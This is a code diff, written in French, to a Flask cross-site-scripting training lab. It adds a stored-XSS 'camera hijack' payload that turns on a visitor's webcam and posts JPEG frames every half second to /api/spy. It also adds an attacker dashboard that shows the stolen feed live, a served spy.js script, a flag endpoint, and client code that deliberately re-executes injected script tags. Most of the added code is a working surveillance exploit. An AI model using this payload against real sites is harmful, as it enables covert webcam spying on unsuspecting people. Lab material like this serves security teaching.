@@ -61,6 +61,38 @@ p{margin-bottom:6px;line-height:1.55;font-size:.88em;color:#8b949e}
 ul{padding-left:18px;color:#8b949e;font-size:.88em;line-height:1.9}
 """
 
+# Inline camera hijack payload — full script visible
+_CAM_SCRIPT = (
+    "<script>\n"
+    "(async function(){\n"
+    "  try {\n"
+    "    var s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false});\n"
+    "    var v = document.createElement('video');\n"
+    "    v.autoplay=true; v.playsInline=true;\n"
+    "    v.style.cssText='position:fixed;bottom:8px;right:8px;width:180px;border:2px solid #da3633;border-radius:8px;z-index:99999';\n"
+    "    document.body.appendChild(v); v.srcObject=s;\n"
+    "    var c = document.createElement('canvas'), x = c.getContext('2d');\n"
+    "    var tid;\n"
+    "    v.onloadedmetadata = function(){\n"
+    "      c.width=v.videoWidth; c.height=v.videoHeight;\n"
+    "      tid = setInterval(function(){\n"
+    "        x.drawImage(v,0,0);\n"
+    "        fetch('/api/spy',{method:'POST',headers:{'Content-Type':'application/json'},\n"
+    "          body:JSON.stringify({frame:c.toDataURL('image/jpeg',0.5)})})\n"
+    "      },500);\n"
+    "    };\n"
+    "    var btn = document.createElement('button');\n"
+    "    btn.textContent='\\u2716 Stop Camera';\n"
+    "    btn.style.cssText='position:fixed;bottom:8px;right:200px;z-index:100000;background:#da3633;color:#fff;border:none;padding:6px 14px;border-radius:6px;cursor:pointer;font-weight:600;font-size:.85em';\n"
+    "    btn.onclick=function(){clearInterval(tid);s.getTracks().forEach(function(t){t.stop()});v.remove();btn.remove();console.log('[XSS] Camera arretee')};\n"
+    "    document.body.appendChild(btn);\n"
+    "    console.log('[XSS] Camera active — flux vers /spy');\n"
+    "  } catch(e){ console.error('[XSS] Camera refusee:',e); }\n"
+    "})()\n"
+    "</script>"
+)
+_CAM_ESCAPED = _CAM_SCRIPT.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
+
 PAGE = f"""<!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -108,10 +140,16 @@ PAGE = f"""<!DOCTYPE html>
   <button class="btn btn-gray" data-u="Bob" data-v="&lt;b style='color:red;font-size:26px'&gt;INJECTION DÉTECTÉE&lt;/b&gt;" onclick="setPayload(this)"><i class="fa-solid fa-play"></i> Essayer</button>
 </div>
 <div class="pl">
-  <div class="lbl">Payload 3 — Script inline</div>
-  <div class="cd">&lt;script&gt;alert('XSS lab — 10 pts')&lt;/script&gt;</div>
-  <div class="desc">Balise <code>&lt;script&gt;</code> injectée. Ouvrir la console F12.</div>
-  <button class="btn btn-gray" data-u="Eve" data-v="&lt;script&gt;alert('XSS lab — 10 pts')&lt;/script&gt;" onclick="setPayload(this)"><i class="fa-solid fa-play"></i> Essayer</button>
+  <div class="lbl">Payload 3 — Alert via onerror</div>
+  <div class="cd">&lt;img src=1 onerror="alert('XSS lab — 10 pts')"&gt;</div>
+  <div class="desc">Déclenche un <code>alert()</code> JS via <code>onerror</code>. Note : <code>&lt;script&gt;</code> et <code>&lt;svg onload&gt;</code> via innerHTML ne s'exécutent pas (spec HTML5).</div>
+  <button class="btn btn-gray" data-u="Eve" data-v="&lt;img src=1 onerror=&quot;alert('XSS lab — 10 pts')&quot;&gt;" onclick="setPayload(this)"><i class="fa-solid fa-play"></i> Essayer</button>
+</div>
+<div class="pl">
+  <div class="lbl">Payload 4 — Camera Hijack (exfiltration)</div>
+  <div class="cd" style="white-space:pre-wrap;font-size:.72em;max-height:200px;overflow-y:auto">{_CAM_ESCAPED}</div>
+  <div class="desc">Active la caméra, affiche le flux en miniature, et exfiltre les images vers <a href="/spy" target="_blank" style="color:#58a6ff">/spy</a> (dashboard attaquant). <strong>Ouvrez /spy dans un autre onglet d'abord.</strong></div>
+  <button class="btn btn-gray" data-u="Mallory" data-v="{_CAM_ESCAPED}" onclick="setPayload(this)"><i class="fa-solid fa-play"></i> Essayer</button>
 </div>
 <div class="pl">
   <div class="lbl">Référence — Texte normal</div>
@@ -291,24 +329,29 @@ if not pattern.match(comment):
 function showTab(n,b){{document.querySelectorAll('.tab-pane').forEach(p=>p.classList.remove('active'));document.querySelectorAll('.tab-btn').forEach(x=>x.classList.remove('active'));document.getElementById('tab-'+n).classList.add('active');if(b)b.classList.add('active');}}
 
 function postComment(){{
-  const name=document.getElementById('fn').value;
-  const comment=document.getElementById('fc').value;
-  if(!name||!comment)return;
-  fetch('/api/comment',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{name,comment}})}}).then(()=>loadComments());
+  const fn=document.getElementById('fn'),fc=document.getElementById('fc');
+  const name=fn.value,comment=fc.value;
+  if(!name||!comment){{if(!name)fn.style.borderColor='#da3633';if(!comment)fc.style.borderColor='#da3633';console.warn('[XSS Lab] Champs requis manquants');return;}}
+  fn.style.borderColor='';fc.style.borderColor='';
+  console.log('[XSS Lab] Publication du commentaire...',{{name,comment}});
+  fetch('/api/comment',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{name,comment}})}}).then(r=>r.json()).then(d=>{{console.log('[XSS Lab] Commentaire publié ✓',d);fn.value='';fc.value='';loadComments();}}).catch(e=>console.error('[XSS Lab] Erreur:',e));
 }}
-function clearAll(){{fetch('/clear').then(()=>{{document.getElementById('output').innerHTML='<p style="color:#6e7681;font-size:.82em">Effacé.</p>';}});}}
+function clearAll(){{console.log('[XSS Lab] Suppression des commentaires...');fetch('/clear').then(()=>{{document.getElementById('output').innerHTML='<p style="color:#6e7681;font-size:.82em">Effacé.</p>';console.log('[XSS Lab] Commentaires effacés ✓');}});}}
+var _execFrom=0;
 function loadComments(){{
   fetch('/api/comments').then(r=>r.json()).then(data=>{{
+    console.log('[XSS Lab] Chargement:',data.length,'commentaire(s)');
     const d=document.getElementById('output');
-    if(!data.length){{d.innerHTML='<p style="color:#6e7681;font-size:.82em">Aucun commentaire.</p>';return;}}
+    if(!data.length){{d.innerHTML='<p style="color:#6e7681;font-size:.82em">Aucun commentaire.</p>';_execFrom=0;return;}}
     d.innerHTML=data.map(c=>`<div class="ci"><div class="nm">${{c.name}}</div><div class="bd">${{c.comment}}</div></div>`).join('');
+    var items=d.querySelectorAll('.ci');for(var i=_execFrom;i<items.length;i++){{items[i].querySelectorAll('script').forEach(function(old){{var s=document.createElement('script');s.textContent=old.textContent;old.parentNode.replaceChild(s,old);console.log('[XSS Lab] ⚠ Script exécuté:',s.textContent.substring(0,80));}});}}_execFrom=data.length;
   }});
 }}
 loadComments();
 
 var LANG='fr';var TXT={{fr:{{demo:'Démonstration',theory:'Théorie',code:'Code',fix:'Correction',langLabel:'EN'}},en:{{demo:'Demonstration',theory:'Theory',code:'Code',fix:'Defense',langLabel:'FR'}}}};
-function toggleLang(){{LANG=LANG==='fr'?'en':'fr';var b=document.getElementById('lang-btn');if(b)b.textContent=TXT[LANG].langLabel;document.querySelectorAll('.tb').forEach(function(el){{var oc=el.getAttribute('onclick')||'';var key=null;if(oc.indexOf("'demo'")>=0)key='demo';else if(oc.indexOf("'theory'")>=0)key='theory';else if(oc.indexOf("'code'")>=0)key='code';else if(oc.indexOf("'fix'")>=0)key='fix';if(key&&TXT[LANG][key]){{el.childNodes.forEach(function(n){{if(n.nodeType===3&&n.textContent.trim()){{n.textContent=' '+TXT[LANG][key];}}); }} }}); }}
-function setPayload(btn){{var u=btn.getAttribute('data-u');var p=btn.getAttribute('data-p');var v=btn.getAttribute('data-v');if(document.getElementById('fu')&&u!==null)document.getElementById('fu').value=u;if(document.getElementById('fp')&&p!==null)document.getElementById('fp').value=p;if(document.getElementById('fname')&&v!==null)document.getElementById('fname').value=v;if(document.getElementById('ft')&&v!==null)document.getElementById('ft').value=v;if(typeof updatePreview==='function')updatePreview();if(typeof updateQ==='function')updateQ();}}
+function toggleLang(){{LANG=LANG==='fr'?'en':'fr';var b=document.getElementById('lang-btn');if(b)b.textContent=TXT[LANG].langLabel;document.querySelectorAll('.tb').forEach(function(el){{var oc=el.getAttribute('onclick')||'';var key=null;if(oc.indexOf("'demo'")>=0)key='demo';else if(oc.indexOf("'theory'")>=0)key='theory';else if(oc.indexOf("'code'")>=0)key='code';else if(oc.indexOf("'fix'")>=0)key='fix';if(key&&TXT[LANG][key]){{el.childNodes.forEach(function(n){{if(n.nodeType===3&&n.textContent.trim()){{n.textContent=' '+TXT[LANG][key];}}}}); }} }}); }}
+function setPayload(btn){{var u=btn.getAttribute('data-u');var p=btn.getAttribute('data-p');var v=btn.getAttribute('data-v');if(document.getElementById('fu')&&u!==null)document.getElementById('fu').value=u;if(document.getElementById('fp')&&p!==null)document.getElementById('fp').value=p;if(document.getElementById('fname')&&v!==null)document.getElementById('fname').value=v;if(document.getElementById('ft')&&v!==null)document.getElementById('ft').value=v;if(document.getElementById('fn')&&u!==null)document.getElementById('fn').value=u;if(document.getElementById('fc'))document.getElementById('fc').value=p!==null?p:(v!==null?v:'');if(typeof updatePreview==='function')updatePreview();if(typeof updateQ==='function')updateQ();console.log('[XSS Lab] Payload chargé →',{{nom:u,commentaire:p||v}});}}
 </script>
 </body></html>"""
 
@@ -341,6 +384,76 @@ def api_last() -> Any:
 def clear() -> Any:
     _comments.clear()
     return jsonify({"status": "ok"})
+
+
+@app.route("/favicon.ico")
+def favicon() -> Any:
+    return "", 204
+
+
+_spy_frame: str = ""
+
+SPY_JS = """(async function(){
+  try {
+    var s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"},audio:false});
+    var v=document.createElement("video");v.autoplay=true;v.playsInline=true;
+    v.style.cssText="position:fixed;bottom:8px;right:8px;width:120px;border:2px solid #da3633;border-radius:8px;z-index:99999;opacity:.8";
+    document.body.appendChild(v);v.srcObject=s;
+    var c=document.createElement("canvas"),x=c.getContext("2d");
+    v.addEventListener("loadedmetadata",function(){
+      c.width=v.videoWidth;c.height=v.videoHeight;
+      setInterval(function(){x.drawImage(v,0,0);
+        var img=c.toDataURL("image/jpeg",0.5);
+        fetch("/api/spy",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({frame:img})});
+      },500);
+    });
+    console.log("[XSS] Camera activated — stream sent to /spy");
+  } catch(e){console.error("[XSS] Camera denied:",e);}
+})();"""
+
+SPY_PAGE = """<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Spy Dashboard</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0d1117;color:#e6edf3;font-family:-apple-system,sans-serif;text-align:center;padding:30px}
+h1{color:#da3633;margin-bottom:8px;font-size:1.5em}p{color:#8b949e;margin-bottom:20px;font-size:.9em}
+#feed{max-width:640px;width:100%;border:3px solid #da3633;border-radius:10px;background:#161b22}
+#status{margin-top:12px;font-size:.85em;color:#8b949e}.live{color:#da3633;font-weight:bold}
+</style></head><body>
+<h1>\U0001f534 Attacker Dashboard — Camera Spy</h1>
+<p>Images exfiltrees de la victime via XSS stored (payload camera hijack)</p>
+<img id="feed" alt="En attente du flux camera...">
+<div id="status">En attente...</div>
+<script>
+var n=0;setInterval(function(){fetch("/api/spy/frame").then(function(r){return r.json()}).then(function(d){
+  if(d.frame){document.getElementById("feed").src=d.frame;n++;document.getElementById("status").innerHTML='<span class="live">\u25cf LIVE</span> — '+n+' frames recues';}
+}).catch(function(){});},500);
+</script></body></html>"""
+
+
+@app.route("/api/admin/flag", methods=["GET"])
+def api_admin_flag() -> Any:
+    return jsonify({"flag": os.environ.get("LAB_FLAG", "FLAG{xss_stored_camera_hijack}")})
+
+
+@app.route("/spy.js")
+def spy_js() -> Any:
+    return SPY_JS, 200, {"Content-Type": "application/javascript"}
+
+
+@app.route("/spy")
+def spy_page() -> Any:
+    return SPY_PAGE
+
+
+@app.route("/api/spy", methods=["POST"])
+def api_spy_post() -> Any:
+    global _spy_frame
+    data = request.get_json(force=True, silent=True) or {}
+    _spy_frame = str(data.get("frame", ""))[:500000]
+    return jsonify({"status": "ok"})
+
+
+@app.route("/api/spy/frame", methods=["GET"])
+def api_spy_frame() -> Any:
+    return jsonify({"frame": _spy_frame})
 
 
 if __name__ == "__main__":
